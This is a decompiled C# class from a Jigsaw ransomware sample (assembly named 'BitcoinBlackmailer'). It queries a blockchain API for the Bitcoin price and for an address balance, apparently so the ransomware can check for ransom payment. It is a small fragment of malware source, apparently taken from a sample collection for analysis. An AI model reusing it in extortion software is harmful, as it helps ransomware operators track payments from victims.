// Decompiled with JetBrains decompiler
// Type: Main.Tools.Blockr
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 1950B17F-8BE4-40AB-B698-96070A0C2297
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-31a9ca0a1f20618bf113dd2b03a0cb28fc003a800e49c74b97e9baca5acc26e2.exe

using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace Main.Tools
{
  internal static class Blockr
  {
    private static string BlockrAddress => "http://btc.blockr.io/api/v1/";

    internal static double GetPrice()
    {
      JObject jobject = JObject.Parse(new WebClient().DownloadString(Blockr.BlockrAddress + "coin/info/"));
      JToken jtoken = jobject["status"];
      if (jtoken != null && ((object) jtoken).ToString() == "error")
        throw new Exception(((object) jobject).ToString());
      return jobject["data"][(object) "markets"][(object) "coinbase"].Value<double>((object) "value");
    }

    internal static double GetBalanceBtc(string address)
    {
      JObject jobject = JObject.Parse(new WebClient().DownloadString(Blockr.BlockrAddress + "address/balance/" + address));
      JToken jtoken = jobject["status"];
      if (jtoken != null && ((object) jtoken).ToString() == "error")
        throw new Exception(((object) jobject).ToString());
      return jobject["data"].Value<double>((object) "balance");
    }
  }
}
